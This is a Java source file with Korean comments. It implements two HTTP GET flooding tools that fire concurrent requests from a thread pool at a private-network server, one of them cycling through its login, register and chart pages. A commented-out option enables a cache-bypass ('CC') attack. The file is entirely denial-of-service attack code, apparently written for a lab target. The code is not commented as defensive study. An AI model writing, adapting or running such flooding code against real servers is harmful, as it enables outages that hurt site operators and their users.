import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Callable;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

/*
 * 일반적인 Get Flooding 코드 
 * 옵션 cc 추가 
 *
 */
public class getFlooding {
	public static void main(String[] args) throws Exception {
		 URL url = new URL("http://192.168.159.217/");
	        long beforeTime = System.currentTimeMillis();
	        int totalRequests = 250; // 총 요청 횟수
	        int successCount = 0; // 성공한 요청 횟수
	        ExecutorService executorService = Executors.newFixedThreadPool(25); // 스레드 풀 생성

	        List<Callable<Integer>> callables = new ArrayList<>();
	        for (int i = 0; i < totalRequests; i++) {
	            callables.add(() -> {
	                try {
	                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
	                    conn.setRequestMethod("GET");
	   // conn.setRequestProperty("Cache-Control", "no-store, must-revalidate"); // Cache- Control: no-store, must- revalidate 옵션입니다. CC 공격 시 주석처리 해제
	                    if (conn.getResponseCode() == 200) { // 성공한 경우
	                        return 1;
	                    }
	                } catch (IOException e) {
	                    e.printStackTrace();
	                }
	                return 0;
	            });
	        }

	        List<Future<Integer>> futures = executorService.invokeAll(callables);
	        executorService.shutdown(); // 스레드 풀 종료

	        for (Future<Integer> future : futures) {
	            successCount += future.get();
	        }

	        // 결과 출력
	        long afterTime = System.currentTimeMillis(); // 코드 실행 후에 시간 받아오기
	        long secDiffTime = (afterTime - beforeTime) / 1000; // 두 시간에 차 계산
	        System.out.println("전송 완료 시간: " + secDiffTime + "초");
	        System.out.println("Success count: " + successCount);
	}
}


/*
 * ---------------------------------------------------------------------------------------
 */

/*
 * 동적 GetFlooding 코드 
 *
 */

public class syncGetFlooding {
	public static void main(String[] args) throws Exception {
		List<String> urls = new ArrayList<>();
		urls.add("http://192.168.159.217/");
        urls.add("http://192.168.159.217/login.html");
        urls.add("http://192.168.159.217/register.html");
        urls.add("http://192.168.159.217/register.html");
        urls.add("http://192.168.159.217/utilities-color.html");
        urls.add("http://192.168.159.217/charts.html");
        // 추가적인 URL들을 필요한 만큼 추가합니다.

        long beforeTime = System.currentTimeMillis();
        int totalRequests = 200; // 총 요청 횟수
        int successCount = 0; // 성공한 요청 횟수
        ExecutorService executorService = Executors.newFixedThreadPool(25); // 스레드 풀 생성

        List<Callable<Integer>> callables = new ArrayList<>();
        for (int i = 0; i < totalRequests; i++) {
            int urlIndex = i % urls.size(); // URL 목록에서 순환하도록 인덱스 계산
            String urlString = urls.get(urlIndex);
            final URL url = new URL(urlString);

            callables.add(() -> {
                try {
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    if (conn.getResponseCode() == 200) { // 성공한 경우
                        return 1;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return 0;
            });
        }

        List<Future<Integer>> futures = executorService.invokeAll(callables);
        
        executorService.shutdown(); // 스레드 풀 종료

        for (Future<Integer> future : futures) {
            successCount += future.get();
        }

     // 결과 출력
        long afterTime = System.currentTimeMillis(); // 코드 실행 후에 시간 받아오기
        long secDiffTime = (afterTime - beforeTime) / 1000; // 두 시간에 차 계산
        System.out.println("전송 완료 시간: " + secDiffTime + "초");
        System.out.println("Success count: " + successCount);

	}
}
